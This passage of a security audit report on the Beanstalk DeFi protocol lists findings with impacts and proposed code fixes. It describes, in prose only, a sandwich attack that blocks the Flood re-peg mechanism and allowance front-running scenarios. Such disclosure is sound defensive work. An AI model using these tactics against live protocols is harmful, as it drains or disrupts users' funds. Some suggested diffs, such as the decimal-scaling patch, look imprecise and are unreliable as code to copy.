+           uint32 decimalDifference = currentTokenDecimals - savedDecimals;
+           s.fundraisers[id].total = s.fundraisers[id].total * decimalDifference;
+           s.fundraisers[id].remaining = s.fundraisers[id].remaining * decimalDifference;
+       } else {
+           uint32 decimalDifference = savedDecimals - currentTokenDecimals;
+           s.fundraisers[id].total = s.fundraisers[id].total / decimalDifference;
+           s.fundraisers[id].remaining = s.fundraisers[id].remaining / decimalDifference;
+       }
+   }

    // AppStorage.sol
    struct Fundraiser {
        address payee;
        address token;
        uint256 total;
        uint256 remaining;
        uint256 start;
+       uint256 savedDecimals;
    }
```


### Flood mechanism is susceptible to DoS attacks by a frontrunner, breaking re-peg mechanism when BEAN is above 1 USD

**Description:** A [call](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L276) to the BEAN/3CRV Metapool is made within`Weather::sop`, swapping Beans for 3CRV, to aid in returning Beanstalk to peg via a mechanism known as "Flood" (formerly Season of Plenty, or sop) when the Beanstalk Farm has been "Oversaturated" ($P > 1$; $Pod Rate < 5\%$) for more than one Season and for each additional Season in which it continues to be Oversaturated. This is achieved by minting additional Beans and selling them directly on Curve, distributing the proceeds from the sale as 3CRV to Stalkholders.

Unlike [`Oracle::stepOracle`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L57), which returns the [aggregate time-weighted `deltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L42-L46) value across both the BEAN/3CRVMetapool and BEAN/ETH Well, the current shortage/excess of Beans during the [handling of Rain](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L243) in [`Weather::stepWeather`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L192) are [calculated directly](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L260) from the Curve Metapool via [`LibBeanMetaCurve::getDeltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L260).

```solidity
    function getDeltaB() internal view returns (int256 deltaB) {
        uint256[2] memory balances = C.curveMetapool().get_balances();
        uint256 d = getDFroms(balances);
        deltaB = getDeltaBWithD(balances[0], d);
    }
```

This introduces the possibility that a long-tail MEV bot could perform a denial-of-service attack on the Flood mechanism by performing a sandwich attack on `SeasonFacet::gm` whenever the conditions are met such that `Weather::sop` is called. The attacker would first front-run the transaction by selling BEAN for 3CRV, bringing the price of BEAN back to peg, which could result in [`newBeans <= 0`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L261), thus bypassing the subsequent logic, and then back-running to repurchase their sold BEAN effectively maintaining the price of BEAN above peg.

The cost for performing this attack is 0.08% of the utilized funds. However, not accounting for other mechanisms (such as Convert) designed to return the price of Bean to peg, Beanstalk would need to wait the Season duration of 1 hour before making another effective `SeasonFacet::gm`, provided that the previous transaction did not revert. In the subsequent call, the attacker can replicate this action at the same cost, and it is possible that the price of BEAN may have increased further during this hour.

**Impact:** Attempts by Beanstalk to restore peg via the Flood mechanism are susceptible to denial-of-service attacks by a sufficiently well-funded sandwich attacker through frontrunning of `SeasonFacet::gm`.

**Recommended Mitigation:** Consider the use of an oracle to determine how many new Beans should be minted and sold for 3CRV. This implies the following modification:
```diff
    function sop() private {
-       int256 newBeans = LibBeanMetaCurve.getDeltaB();
+       int256 currentDeltaB = LibBeanMetaCurve.getDeltaB();
+       (int256 deltaBFromOracle,)  = - LibCurveMinting.twaDeltaB();
+       // newBeans = max(currentDeltaB, deltaBFromOracle)
+       newBeans = currentDeltaB > deltaBFromOracle ? currentDeltaB : deltaBFromOracle;

        if (newBeans <= 0) return;

        uint256 sopBeans = uint256(newBeans);
        uint256 newHarvestable;

        // Pay off remaining Pods if any exist.
        if (s.f.harvestable < s.r.pods) {
            newHarvestable = s.r.pods - s.f.harvestable;
            s.f.harvestable = s.f.harvestable.add(newHarvestable);
            C.bean().mint(address(this), newHarvestable.add(sopBeans));
        } else {
            C.bean().mint(address(this), sopBeans);
        }

        // Swap Beans for 3CRV.
        uint256 amountOut = C.curveMetapool().exchange(0, 1, sopBeans, 0);

        rewardSop(amountOut);
        emit SeasonOfPlenty(s.season.current, amountOut, newHarvestable);
    }
```

The motivation for using the maximum value between the current `deltaB` and that calculated from time-weighted average balances is that the action of an attacker increasing `deltaB` to carry out a sandwich attack would be nonsensical as excess Bean minted by the Flood mechanism would be sold for additional 3CRV. In this way, anyone attempting to increase `deltaB` would essentially be giving away their 3CRV LP tokens to Stalkholders. Therefore, by using the maximum `deltaB`, it is ensured that the impact of any attempt to execute the attack described above would be minimal and economically unattractive. If no one attempts the attack, the behavior will remain as originally intended.

\clearpage
## Low Risk


### Lack of existence validation when adding a new unripe token

**Description:** [`UnripeFacet::addUnripeToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/barn/UnripeFacet.sol#L227-L236) does not currently check if the `unripeToken` has been already added. Unlike `LibWhitelist::whitelistToken`, which has [this check](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibWhitelist.sol#L80), the current implementation allows the Beanstalk Community Multisig (BCM) to modify the settings for existing unripe tokens.

**Impact:** Unripe tokens were introduced as a mechanism for recapitalization after the governance hack of April 2022. While the BCM affords more flexibility and control compared to the previous implementation of fully on-chain governance, if the BCM were to become compromised in any way or sign off on a vulnerable contract upgrade, privileged access to this function could result in the ability to manipulate the unripe token mechanisms that exist within the protocol by altering the Merkle root for a pre-existing unripe token.

**Recommended Mitigation:** Validate that the unripe token has not already been added to prevent changes to existing unripe tokens.


### Silent failure can occur when delegating to a Diamond Proxy facet with no code

**Description:** If the [Diamond proxy delegates](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/Diamond.sol#L35-L55) to an incorrect address or an implementation that has been self-destructed, the call to the "implementation" will return a success boolean despite no code being executed.

**Impact:** In the case of a payable function call with ETH attached, silent failure of the delegatecall to a non-existent implementation can result in this value being permanently lost.

**Proof of Concept:** The *No contract existence check* section of the article [*Good idea, bad design: How the Diamond standard falls short*](https://blog.trailofbits.com/2020/10/30/good-idea-bad-design-how-the-diamond-standard-falls-short/) by [Trail of Bits](https://www.trailofbits.com/) further details this issue.

**Recommended Mitigation:** Consider checking for contract existence when calling an arbitrary contract. Alternatively, in the interest of gas efficiency, only perform this check if the return data size of the call is zero since the opposite result means that some code was executed.


### Silent failure can occur in `Pipeline` function calls if the target has no code

**Description:** In the case of a `Pipeline` function call to a target address with no code, the call will silently fail. Scenarios where this may occur include calls to non-contract addresses or on a contract where its self-destruction occurs beforehand. This is most relevant when considering [`Pipeline::advancedPipe`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/pipeline/Pipeline.sol#L91) given that the next call uses as input the return from the previous call which may lead to an undesired final result or revert. Pipeline can be used standalone but it is also wrapped by Beanstalk for use within the protocol by the [DepotFacet](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/DepotFacet.sol#L15-L16).

**Impact:** Silent failure of a call to an address with no code produces a silent failure within Pipeline, which can lead to undesired final outcomes. According to the [Pipeline Whitepaper](https://evmpipeline.org/pipeline.pdf):
>The combination of Pipeline, Depot and Clipboard allows EVM users to perform arbitrary validations, through arbitrarily many protocols, in a single transaction.

This implies that Pipeline should be able to be used with any protocol; therefore, the edge case must be considered where a call to a contract that has just been self-destructed should revert. Considering the low likelihood, this issue is determined to be of **LOW** severity.

**Recommended Mitigation:** If `Pipeline` is intended to support calls to EOA, and to prevent silent failure to this kind of address, an extra attribute `isContractCall` can be added to `PipeCall` and `AdvancedPipeCall` - if the call return data size is zero, and this value is true, then it should be checked whether the call was performed on a target contract, and if not then revert.



### Missing allowance in `CurveFacet`

**Description:** When liquidity is added to a Curve pool via `CurveFacet::addLiquidity`, the Beanstalk Diamond first [receives tokens](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L112-L116) from the caller and then [sets approvals](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L117) to allow the pool to pull these tokens via `ERC20::transferFrom`. Currently, in `CurveFacet::removeLiquidity`, there is no logic for setting allowances on LP tokens before [calling the pool `remove_liquidity` function](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L180-L183) as typically the pool and LP token addresses are the same, which means that the relevant burn function can be called internally; however, some pools such as 3CRV and Tri-Crypto (which are already handled differently within a [conditional block](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L175)) require an allowance to call `ERC20::burnFrom` given that the pool and LP token addresses differ in these cases.

**Impact:** Callers of the `CurveFacet` may be unable to remove liquidity from the 3CRV and Tri-Crypto pools via Beanstalk.

**Recommended Mitigation:** Unless an infinite approval is already set by the Beanstalk Diamond on these pools, which does not appear to be the case and in any case is not recommended, logic to approve the corresponding pools for these LP tokens should be added to `CurveFacet::removeLiquidity` before the actual call to remove liquidity.


### Missing reentrancy guard in `TokenFacet::transferToken`

Unlike most other external and potentially state-modifying functions in `TokenFacet`, [`TokenFacet::transferToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L56-L62) does not have the `nonReentrant` modifier applied. While we have been unable to identify a vector for exploit based on the current commit hash, it is recommended to add the modifier to this function to be in keeping with the rest of the code and prevent any potential future misuse.


### When a Pod order is partially filled, the remaining amount pending to fill may not be able to be filled

Whenever a Pod order is partially filled, the remaining amount to fill cannot be filled if it is less than the `minFillAmount` set when the order was created. This current behavior forces the creator of the Pod order to cancel the Pod listing, creating a new one with a new `minFillAmount` and applies to both [v1](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L191-L200) and [v2](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L217-L227) listings.

Depending on the desired behavior:
1. The `minFillAmount` can be decreased to a value lower than/equal to the amount pending to fill.
2. The Pod listing for the remaining amount to fill can be canceled.


### `Listing::getAmountPodsFromFillListing` underflow can lead to undesired behaviour of `Listing::_fillListing`

If [`fillBeanAmount * 1_000_000 > type(uint256).max`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L144), the output of [`Listing::getAmountPodsFromFillListing`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L144) would be less than expected, which can lead to the loss of user funds through `Listing::_fillListing`. However, the conditions for this issue to arise are highly unlikely given that `MarketplaceFacet::fillPodListing` is the only function that makes use of this function, and which previously performs a [Bean transfer](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L70) of `fillBeanAmount`.  The large number of tokens required to produce the undesired behavior notwithstanding, considering the economic impact, use of `SafeMath` when performing the quoted operation should be considered here.


### Creation of a new Pod order in place of an existing order requires excess Beans

When creating a new Pod order, a user needs to send the Beans required to fulfill the order. If an order already exists with the same sender, `pricePerPod`, `maxPlaceInLine`, and `minFillAmount`, this order must first be canceled, which implies a refund of the previously sent Beans.

One issue with this workflow, which applies to both [v1](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L62-L68) and [v2](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L80-L83) orders, is that if the user overrides an existing order, they must send additional Beans because those for the previous order are not considered. Instead, it would make more sense to first cancel the existing order, then try to fulfill the Bean requirement with that of the canceled order, and only if this is not sufficient require the caller send additional Beans.


### Unchecked decrement results in integer underflow in `LibStrings::toString`

**Description:** The implementation of [`LibStrings::toString`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L16-L37) is intended to convert an unsigned integer to its string representation. If the value provided is non-zero, the function determines the number of digits in the number, creates a byte buffer of the appropriate size, and then populates that buffer with the ASCII representation of each digit. However, given Beanstalk uses a Solidity compiler version lower than `0.8.0` in which safe, checked math was introduced as default, this library is susceptible to over/underflow of unchecked math operations. One such issue arises when [post-decrementing the `index`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L33), initialized as [`digits - 1`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibStrings.sol#L30), which underflows on the final loop iteration.


**Impact:** Evidence of underflow is visible in the use of this function on-chain in both `MetadataFacet::uri`:

![URI](img/uri.png)

and `MetadataImage::imageURI`:

![Image](img/overlap.png)

The "Deposit stem" [attribute](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L37) is incredibly large due to wrap-around of the maximum `uint256` value, and the same issue applies to [`MetadataImage::blackBars`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L528) called within [`MetadataImage::generateImage](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L35-L49) which causes the stem string representation to overlap with the ["Bean Deposit" text](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataImage.sol#L538-L539).

This issue should be resolved to display accurate metadata, given the following disclaimer in `MetadataFacet::uri`:
> DISCLAIMER: Due diligence is imperative when assessing this NFT. Opensea and other NFT marketplaces cache the svg output and thus, may require the user to refresh the metadata to properly show the correct values."

**Recommended Mitigation:** Initialize `index` to `digits` and pre-decrement instead to avoid underflow on the final loop iteration.


### Incorrect formatting of `MetadataFacet::uri` JSON results in broken metadata which cannot be displayed by external clients

**Description:** For fully on-chain metadata, external clients expect the URI of a token to contain a base64 encoded JSON object that contains the metadata and base64 encoded SVG image. Currently, [`MetadataFacet::uri`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L30-L51) is missing multiple quotations and commas within the encoded string which breaks its JSON formatting.

**Impact:** External clients such as OpenSea are currently unable to display Beanstalk token metadata due to broken JSON formatting.

**Recommended Mitigation:** Add missing quotation marks and commas. Ensure the resulting encoded bytes are that of valid JSON.


### Spender can front-run calls to modify token allowances, resulting in DoS and/or spending more than was intended

**Description:** When updating the allowance for a spender that is less than the value currently set, a well-known race condition allows the spender to spend more than the caller intended by front-running the transaction that performs this update. Due to the nature of the `ERC20::approve` implementation and [other](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ApprovalFacet.sol#L46-L54) [variants](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L104-L110) [used](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/MarketplaceFacet.sol#L244-L252) within the Beanstalk system, which update the mapping in storage corresponding to the given allowance, the spender can spend both the existing allowance plus any 'additional' allowance set by the in-flight transaction.

For example, consider the scenario:
* Alice approves Bob 100 tokens.
* Alice later decides to decrease this to 50.
* Bob sees this transaction in the mempool and front-runs, spending his 100 token allowance.
* Alice's transaction executes, and Bob's allowance is updated to 50.
* Bob can now spend an additional 50 tokens, resulting in a total of 150 rather than the maximum of 50 as intended by Alice.

Specific functions named `decreaseTokenAllowance`, intended to decrease approvals for a token spender, have been introduced to both the [`TokenFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L133-L154) and the [`ApprovalFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ApprovalFacet.sol#L84-L93). [`PodTransfer::decrementAllowancePods`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/PodTransfer.sol#L87-L98) similarly exists for the Pod Marketplace.

The issue, however, with these functions is that they are still susceptible to front-running in the sense that a malicious spender could force their execution to revert, violating the intention of the caller to decrease their allowance as they continue to spend that which is currently set. Rather than simply setting the allowance to zero if the caller passes an amount to subtract that is larger than the current allowance, these functions halt execution and revert. This is due to the following line of shared logic:

```solidity
require(
    currentAllowance >= subtractedValue,
    "Silo: decreased allowance below zero"
);
```

Consider the following scenario:
* Alice approves Bob 100 tokens.
* Alice later decides to decrease this to 50.
* Bob sees this transaction in the mempool and front-runs, spending 60 of his 100 token allowance.
* Alice's transaction executes, but reverts given Bob's allowance is now 40.
* Bob can now spend the remaining 40 tokens, resulting in a total of 100 rather than the decreased amount of 50 as intended by Alice.

Of course, in this scenario, Bob could have just as easily front-run Alice's transaction and spent his entire existing allowance; however, the fact that he is able to perform a denial-of-service attack results in a degraded user experience. Similar to setting maximum approvals, these functions should handle maximum approval revocations to mitigate against this issue.

**Impact:** Requiring that the intended subtracted allowance does not exceed the current allowance results in a degraded user experience and, more significantly, their loss of funds due to a different route to the same approval front-running attack vector.

**Recommended Mitigation:** Set the allowance to zero if the intended subtracted value exceeds the current allowance.

\clearpage
## Informational


### The names of numerous state variables should be changed to more verbose alternatives

Currently, it can be confusing when referencing values in storage as it is difficult to make sense of incredibly short attribute names. The following instances have been identified, along with more verbose alternatives:

* `Account::State`:
    * `Silo s` -> `Silo silo`.
* `Storage::Weather`:
    * `uint32 t` -> `uint32 temperature`.
* `Storage::AppStorage`:
    * `mapping (address => Account.State) a` -> `mapping (address => Account.State) account`.
    * `Storage.Contracts c` -> `Storage.Contracts contract`.
    * `Storage.Field f` -> `Storage.Field field`.
    * `Storage.Governance g` -> `Storage.Governance governance`.
    * `CurveMetapoolOracle co` -> `CurveMetapoolOracle curveOracle`.
    * `Storage.Rain r` -> `Storage.Rain rain`.
    * `Storage.Silo s` -> `Storage.Silo silo`.
    * `Storage.Weather w` to `Storage.Weather weather`.


### Constant block time assumption could be invalidated, affecting calculation of `SeasonFacet::gm` incentives

The block time of Ethereum, despite having never been constant, always has a target time toward which blocks are added. On occasion, this value has changed. Initially, in PoW Ethereum, the block time target was approximately 13-14 seconds, but with the PoS Merge in 2022 this [changed](https://ycharts.com/indicators/ethereum_average_block_time) to 12 seconds. This means that any [assumption](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L28) of a constant average block time could be invalidated. Therefore, the blocks late [calculation](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L136-L141) within the call to [`SeasonFacet::incentivize`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L61) would be incorrect if, in future, the target block time changes, affecting the [expected Bean rewards](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L65-L107).


### Unused events in `WhitelistFacet` can be removed

The [`WhitelistToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L20-L32), [`UpdatedStalkPerBdvPerSeason`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L34-L44), and [`DewhitelistToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/WhitelistFacet.sol#L46-L50) events in `WhitelistFacet` are not currently used. Moreover, the [same events](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibWhitelist.sol#L19-L55) are already declared in `LibWhitelist` where they are used.



### Potential DoS in `FertilizerFacet::getFertilizers` if enough Fertilizer is added

It is possible that [`FertilizerFacet::getFertilizers`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/barn/FertilizerFacet.sol#L172-L192) can be susceptible to DoS if enough Fertilizer NFTs are minted, given that it attempts to query all the nodes of a linked list in two separate while loops. This function is not used anywhere else within the protocol and appears for UI/UX purposes only, but any potential third-party integrations should consider this issue carefully.



### Additional documentation should be added regarding the correct use of `pricingFunction` for v2 Pod listings

When creating a v2 Pod listing, users are required to pass a [pricing function](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Listing.sol#L91) that will determine the price per Pod depending on the Plot index plus the starting position of Pods inside the Plot and the historical account of harvestable Pods. The difference between these two values yields the [`placeInLine`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/market/MarketplaceFacet/Order.sol#L133) parameter of `Order::_fillPodOrderV2`, which is in units of Pods/Beans and thus has six decimals of precision.

[`LibPolynomial::evaluatePolynomialPiecewise`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPolynomial.sol#L85-L94) evaluates the price per Pod by considering that its parameter `x`, which corresponds to `placeInLine`, has no fixed-point decimals and then executes a third-degree polynomial function depending on the user-supplied `pricingFunction`.

If `x` is considered to have no decimals, then there arises a problem with $placeInLine^{n}$ if $n \neq 1$ given that the number of decimals for each term would increase to $(n -1) \times 6$. This error must, therefore, be handled by the `pricingFunction` bytes, which can be divided into five constituent parameters:
* n (32 bytes): Corresponds to the number of pieces to consider. Each piece consists of a third-degree polynomial.
* breakpoint (32n bytes): `x` values where evaluation changes from one piece to another. There is one breakpoint per piece.
* significands (128n bytes): 4 per piece, ordered from most to least significant term.
* exponents (128n bytes): 4 per piece, ordered from the most to least significant term.
* signs (4n bytes): 4 per piece, indicating the term sign of each piece, ordered from the most to least significant term.

Taking note of the example provided in the [comments of `LibPolynomial`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPolynomial.sol#L21-L45), it can be observed that `x` was intended not to have any additional fixed-point decimals. However, this can be handled through `pricingFunction` with the consideration that the exponents should be defined as follows:
1. The exponent corresponding to the cubic term should be 12 plus the significand decimals. Given that $x$ has 6 decimals, then $x^{3}$ will have 18 decimals. Division by $1 \times 10^{12}$ is necessary to keep the value consistent with the target precision.
2. The exponent corresponding second-degree term should be 6 plus the significand decimals. Given that $x$ has 6 decimals, then $x^{2}$ will have 12 decimals. Division by $1 \times 10^{6}$ is necessary to keep the value consistent with the target precision.


### Duplicated update logic to an account's `lastUpdate` in `LibSilo::_mow` can be simplified

Currently, the update to an account's `lastUpdate` in `LibSilo::_mow` occurs twice  both [after handling Flood logic](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L362) and then again at the [end of the function](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L372). It appears that this second instance was added as mitigation against a [different issue](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L370-L371); however, it has the implication that the first instance is no longer needed as the second will always be reached in the case of successful execution, and none of the remaining logic depends on the value of the account's `lastUpdate`.

Additionally, the [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L360-L361) preceding the first update is irrelevant here as the case it describes is [handled by `LibSilo::__mow`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L391-L393)  if the last stem equals the current stem tip then execution ends, and no additional grown stalk can be claimed.


### Use globally available Solidity variables in `C.sol`

When specifying units of time in Solidity, literal numbers can be used with the suffixes `seconds`, `minutes`, `hours`, `days` and `weeks`. In the `C.sol` constants library, the following is recommended:
```diff
- uint256 private constant CURRENT_SEASON_PERIOD = 3600;
+ uint256 private constant CURRENT_SEASON_PERIOD = 1 hours;
```


### Incorrect contract addresses in `C.sol`

There are [two address constants](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L81-L82) in `C.sol` which have been added as part of the BEAN/ETH Well integration. Currently, `BEANSTALK_PUMP` references the crv3crypto address, defined by the [`TRI_CRYPTO`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L62) constant above, while `BEAN_ETH_WELL` references an address with no code. It is understood that these addresses were chosen arbitrarily for the purpose of testing until the final versions of these contracts are deployed. It is also understood that these addresses have been updated in a more recent commit with no impact on test output despite the collision with another existing address within the system.


### Legacy Pipeline address defined in `DepotFacet`

Currently, `DepotFacet` references an old implementation of Pipeline with the todo comment that it should be updated:
```solidity
address private constant PIPELINE =
    0xb1bE0000bFdcDDc92A8290202830C4Ef689dCeaa; // TODO: Update with final address.
```
It is understood that this todo comment has been resolved in a more recent commit and should now appear as follows:
```diff
- address private constant PIPELINE = 0xb1bE0000bFdcDDc92A8290202830C4Ef689dCeaa; // TODO: Update with final address.
+ address private constant PIPELINE = 0xb1bE0000C6B3C62749b5F0c92480146452D15423;
```


### Incorrect comment in `FieldFacet::_sow` NatSpec

The [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/field/FieldFacet.sol#L131) explaining how `FundraiserFacet::fund` bypasses soil updates in the `FieldFacet::_sow` NatSpec incorrectly references `LibDibbler::sowWithMin` when this should in fact be `LibDibbler::sowNoSoil`, as below:

```diff
    /**
     * @dev Burn Beans, Sows at the provided `_morningTemperature`, increments the total
     * number of `beanSown`.
     *
     * NOTE: {FundraiserFacet} also burns Beans but bypasses the soil mechanism
-    * by calling {LibDibbler.sowWithMin} which bypasses updates to `s.f.beanSown`
+    * by calling {LibDibbler.sowNoSoil} which bypasses updates to `s.f.beanSown`
     * and `s.f.soil`. This is by design, as the Fundraiser has no impact on peg
     * maintenance and thus should not change the supply of Soil.
     */
```


### `InitBip9` incorrectly references BIP-8 in the contract NatSpec

The contract NatSpec for `InitBip9` currently incorrectly references BIP-8. This should be updated to avoid confusion:

```diff
    /**
     * @author Publius
-    * @title InitBip8 runs the code for BIP-8.
+    * @title InitBip9 runs the code for BIP-9.
    **/

contract InitBip9 {
```


### Incorrect comment in `InitBipNewSilo`

`InitBipNewSilo` contains the [comment](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L69):

> *emit event for unripe LP/Beans from 4 to 1 grown stalk per bdv per season*

